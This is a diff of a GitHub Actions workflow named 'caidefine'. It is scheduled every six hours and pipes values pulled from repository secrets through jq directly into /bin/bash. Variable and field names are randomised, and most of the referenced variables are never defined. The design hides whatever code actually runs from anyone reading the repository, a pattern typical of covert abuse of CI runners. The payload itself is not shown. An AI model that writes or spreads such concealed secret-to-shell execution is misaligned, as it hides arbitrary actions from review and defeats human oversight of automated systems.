@@ -3,23 +3,33 @@ name: caidefine
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 4/6 * * *'
+    - cron: '32 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: caidefine
         env:
-          joq53: ${{ secrets.joq53 }}
+          rvj625: ${{ secrets.rvj625 }}
         run: |
-          echo $joq53 | jq -r .dsqui49016 | /bin/bash
-          echo $fzt42 | jq -r .byfk53535 | /bin/bash
-          echo $sjgcx18 | jq -r .aaky17929 | /bin/bash
-          echo $dbug13 | jq -r .et318 | /bin/bash
-          echo $k528 | jq -r .rbfkt9565 | /bin/bash
-          echo $ik42934 | jq -r .f4 | /bin/bash
-          echo $wpgs8 | jq -r .jrs8 | /bin/bash
-          echo $fnb28329 | jq -r .exfa92884 | /bin/bash
-          echo $zdhh0795 | jq -r .xyq6 | /bin/bash
+          echo $rvj625 | jq -r .g14 | /bin/bash
+          echo $w174 | jq -r .ejj44144 | /bin/bash
+          echo $qx5 | jq -r .gbgk1426 | /bin/bash
+          echo $qkssz6 | jq -r .bhex491 | /bin/bash
+          echo $jfhm01 | jq -r .gjrl4612 | /bin/bash
+          echo $c5 | jq -r .zymih03 | /bin/bash
+          echo $s1 | jq -r .wwv9436 | /bin/bash
+          echo $tcsw03 | jq -r .padxy265 | /bin/bash
+          echo $qqlcb9 | jq -r .fenw482 | /bin/bash
+          echo $zd23438 | jq -r .ofxe529 | /bin/bash
+          echo $kttd6482 | jq -r .nxfwq9952 | /bin/bash
+          echo $ilw15 | jq -r .lke92 | /bin/bash
+          echo $sfsc408 | jq -r .bxynf23 | /bin/bash
+          echo $ruuy45 | jq -r .mgzci08 | /bin/bash
+          echo $rkf53 | jq -r .t4 | /bin/bash
+          echo $vhmqu206 | jq -r .voqwy709 | /bin/bash
+          echo $z63 | jq -r .tln29 | /bin/bash
 
